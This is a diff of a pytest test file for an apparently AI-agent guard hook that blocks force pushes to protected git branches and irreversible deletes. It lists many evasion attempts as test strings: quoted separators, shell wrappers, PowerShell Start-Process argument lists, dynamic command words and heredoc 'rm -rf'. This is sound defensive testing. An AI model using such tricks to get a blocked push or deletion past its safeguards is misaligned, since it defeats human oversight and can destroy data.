-    assert run("claude", claude("echo x &> .agile.json", repo))[0] == 2
-
-
-# --- security vòng 8 (bản chốt 8c02d24) ----------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
-@pytest.mark.parametrize("cmd", [
-    'git -c x.y="a;b" push --force origin main', "git --namespace='a|b' push --force origin main",
-    'git --no-pager --namespace="a&&b" push --force origin main', 'git -c "x.y=a b;c" push --force origin main',
-    'git -c "x.y=a&b" push --force origin main', 'git --config-env "x;y" push --force origin main',
-])
-def test_quoted_separators_in_git_option_values_do_not_split_the_command(tmp_path, cmd, tool):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo, tool=tool))[0] == 2, cmd
-
-
-def test_quoted_separator_cannot_hide_an_extra_push_ref(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude('git -c x.y="a;b" push origin spr-20-x main', repo))[0] == 2
-
-
-@pytest.mark.parametrize("cmd", ["strace -o log -A git push --force origin main", "strace -F git push --force origin main",
-                                 "unshare -m git push --force origin main", "nsenter -m git push --force origin main"])
-def test_flags_of_unknown_wrappers_are_not_assumed_to_take_a_value(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("cmd", ["curl -o gh https://example.com", "wget -O git https://example.com"])
-def test_known_download_tools_may_name_their_output_git_or_gh(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-def test_powershell_curly_quotes_are_quotes(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    cmd = "echo \"a b” ; git push --force origin main ; echo “c d\""
-    assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2
-    assert run("claude", claude("echo \"a b” ; git push origin main ; echo “c d\"", repo, tool="PowerShell"))[0] == 2
-
-
-@pytest.mark.parametrize("cmd", [
-    "Start-Process git push,--force,origin,main", "Start-Process -FilePath git -ArgumentList push,--force,origin,main", "saps git push,--force,origin,main",
-])
-def test_start_process_argument_lists_are_analysed_as_commands(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2, cmd
-
-
-# --- security vòng 9 (bản 55498d5) -----------------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
-@pytest.mark.parametrize("cmd", [
-    "flock /tmp/l -c 'echo a;git push --force origin main'", "flock -c 'cd .;git push --force origin main' /tmp/l",
-    "ash -c 'echo a;git push --force origin main'", "mksh -c \"echo a;git push --force origin main\"",
-    "rbash -c 'cd .;git push --force origin main'", "yash -c 'true&&git push --force origin main'",
-    "xargs -a f ash -c 'cd .;git push --force origin main'", "watch -n1 'cd .;git push --force origin main'",
-])
-def test_shell_strings_of_less_common_wrappers_are_split_before_looking_for_git(tmp_path, cmd, tool):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo, tool=tool))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("cmd", [
-    "Start-Process git -ArgumentList '-C','.','push','--force','origin','main'", "Start-Process git -ArgumentList -C,.,push,--force,origin,main",
-    "Start-Process git -ArgumentList '-c','x=y','push','--force','origin','main'", "Start-Process powershell -ArgumentList '-c','git push --force origin main'",
-    "Start-Process -FilePath git -ArgumentList @('push','--force','origin','main')", "Start-Process git @('push','--force','origin','main')",
-])
-def test_start_process_argument_lists_starting_with_a_dash_or_array_syntax(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
-@pytest.mark.parametrize("cmd", [
-    'echo "a\n";git push --force origin main;echo "b\n"', "echo 'a\n';git push --force origin main;echo 'b\n'",
-    'echo "a\n"&&git push --force origin main&&echo "b\n"',
-])
-def test_multi_line_strings_cannot_pair_quotes_across_lines_and_hide_a_command(tmp_path, cmd, tool):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo, tool=tool))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("cmd", ["docker run --name gh image", "jira create --title \"git push --force origin main\"",
-                                 "svn commit --message \"git push --force origin main\""])
-def test_long_text_flags_hold_text_not_commands(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-# --- SPR-16b: từ lệnh động và viết lại lệnh để đặt shim lên đầu PATH -------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", ["$(command -v git) push --force origin main", "G=/usr/bin/git; $G push --force origin main",
-                                 "\"$G\" push origin main", "`which git` push --force origin main"])
-def test_dynamic_command_word_with_a_git_subcommand_is_closed_off_in_a_protected_repo(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_dynamic_command_word_without_a_git_subcommand_is_left_alone(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    for cmd in ("$EDITOR notes.txt", "$(date) echo hi", "$HOME/bin/tool --flag"):
-        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-def _shim_run(monkeypatch, repo, cmd, tool="Bash", flag="rewrite"):
-    monkeypatch.setenv(autopilot_guard.ENV_SHIM, flag)
-    return run("claude", {"tool_name": tool, "tool_input": {"command": cmd, "description": "d"}, "cwd": str(repo)})
-
-
-def test_shim_rewrite_is_off_by_default(tmp_path, monkeypatch):
-    repo = protected_repo(tmp_path, branch="x")
-    monkeypatch.delenv(autopilot_guard.ENV_SHIM, raising=False)
-    assert run("claude", claude("git status", repo)) == (0, "", "")
-    assert _shim_run(monkeypatch, repo, "git status", flag="0") == (0, "", "")
-    assert _shim_run(monkeypatch, repo, "git status", flag="1") == (0, "", "")  # "1" chỉ bật shim trong PATH, không viết lại lệnh
-
-
-@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
-def test_shim_rewrite_prefixes_the_original_command_in_a_protected_repo(tmp_path, monkeypatch, tool):
-    repo = protected_repo(tmp_path, branch="x")
-    rc, out, err = _shim_run(monkeypatch, repo, "git status -sb", tool)
-    update = json.loads(out)["hookSpecificOutput"]
-    assert rc == 0 and err == "" and update["hookEventName"] == "PreToolUse" and "permissionDecision" not in update
-    assert update["updatedInput"]["command"].endswith("git status -sb") and "shims" in update["updatedInput"]["command"]
-    assert update["updatedInput"]["description"] == "d"  # trường khác của tool_input giữ nguyên
-
-
-def test_shim_rewrite_leaves_unprotected_repos_and_other_tools_alone(tmp_path, monkeypatch):
-    plain = make_repo(tmp_path, branch="x")  # không dấu hiệu bảo vệ nào
-    assert _shim_run(monkeypatch, plain, "git status") == (0, "", "")
-    repo = protected_repo(tmp_path / "p", branch="x") if (tmp_path / "p").mkdir() is None else None
-    assert _shim_run(monkeypatch, repo, "x", tool="Read") == (0, "", "")
-
-
-def test_shim_rewrite_never_replaces_a_refusal(tmp_path, monkeypatch):
-    repo = protected_repo(tmp_path, branch="x")
-    rc, out, err = _shim_run(monkeypatch, repo, "git push --force origin main")
-    assert rc == 2 and out == "" and "git-fence" in err
-
-
-# --- thông điệp commit nhiều dòng có ngoặc/từ git là văn bản, không phải lệnh (phát hiện khi hook thật chặn commit của chính sprint) ----
-
-def test_multi_line_commit_message_with_parentheses_and_git_words_is_text(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    msg = "SPR-16b: shim git/gh kiem argv (scripts/git_shim.py, shims/)\n\nlenh con git bi dong (AGENT_AGILE_SHIM=1)\n\nCo-Authored-By: A <a@b>"
-    assert run("claude", claude('git commit -m "' + msg + '"', repo)) == (0, "", "")
-    assert run("claude", claude("git add -A && git commit -m '" + msg + "' && git status", repo)) == (0, "", "")
-
-
-def test_multi_line_strings_still_expose_a_real_command_between_two_of_them(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude('echo "a\n";git push --force origin main;echo "b\n"', repo))[0] == 2
-
-
-def _mode_run(monkeypatch, repo, mode, flag=None, tool="Bash"):
-    if flag is None:
-        monkeypatch.delenv(autopilot_guard.ENV_SHIM, raising=False)
-    else:
-        monkeypatch.setenv(autopilot_guard.ENV_SHIM, flag)
-    payload = {"tool_name": tool, "tool_input": {"command": "git status -sb"}, "cwd": str(repo)}
-    if mode is not None:
-        payload["permission_mode"] = mode
-    return run("claude", payload)
-
-
-# SPR-18/TK3 (DN2 a, Đức chốt 2026-11-12): đảo test cũ `..._is_on_by_default_in_modes_that_do_not_ask_about_path`. Test cũ ghim viết lại lệnh Bash/PowerShell
-# MẶC ĐỊNH ở auto/bypass; SPR-17/DN15 muốn mặc định KHÔNG viết lại (viết lại đổi lệnh người dùng thấy). Nay chỉ AGENT_AGILE_SHIM=rewrite mới viết lại.
-@pytest.mark.parametrize("mode", ["bypassPermissions", "auto", "default", "acceptEdits", "plan", None])
-def test_shim_default_does_not_rewrite_bash(tmp_path, monkeypatch, mode):
-    repo = protected_repo(tmp_path, branch="x")
-    for tool in ("Bash", "PowerShell"):
-        assert _mode_run(monkeypatch, repo, mode, tool=tool) == (0, "", "")
-
-
-@pytest.mark.parametrize("mode", ["bypassPermissions", "auto"])
-def test_shim_rewrite_flag_rewrites_in_modes_that_do_not_ask_about_path(tmp_path, monkeypatch, mode):
-    repo = protected_repo(tmp_path, branch="x")
-    for tool in ("Bash", "PowerShell"):
-        rc, out, err = _mode_run(monkeypatch, repo, mode, flag="rewrite", tool=tool)
-        command = json.loads(out)["hookSpecificOutput"]["updatedInput"]["command"]
-        assert rc == 0 and err == "" and command.endswith("git status -sb") and "AGENT_AGILE_SHIM" in command and "shims" in command
-
-
-@pytest.mark.parametrize("mode", ["default", "acceptEdits", "plan", None])
-def test_shim_rewrite_is_skipped_in_modes_that_ask_about_path(tmp_path, monkeypatch, mode):
-    repo = protected_repo(tmp_path, branch="x")
-    assert _mode_run(monkeypatch, repo, mode) == (0, "", "")
-
-
-def test_shim_rewrite_flag_overrides_the_mode_and_zero_or_one_turn_it_off(tmp_path, monkeypatch):
-    repo = protected_repo(tmp_path, branch="x")
-    assert "updatedInput" in _mode_run(monkeypatch, repo, "default", flag="rewrite")[1]
-    for flag in ("0", "1"):
-        assert _mode_run(monkeypatch, repo, "bypassPermissions", flag=flag) == (0, "", "")
+    for cmd in ("bash \\\n<<EOF\nrm -rf x\nEOF", "sh \\\n-s <<EOF\nrm -rf x\nEOF", "bash \\\n<<'EOF'\nrm -rf x\nEOF",
+                "bash -s \\\n  <<-EOF\n\trm -rf x\n\tEOF"):
+        assert_blocked(repo, cmd, "irreversible_delete")
+    assert_allowed(repo, "python - \\\n<<'EOF'\nrm -rf x\nEOF")  # trình không phải shell: thân vẫn là dữ liệu
+    assert_allowed(repo, "python - \\\n<<EOF\nx\nEOF\nls")
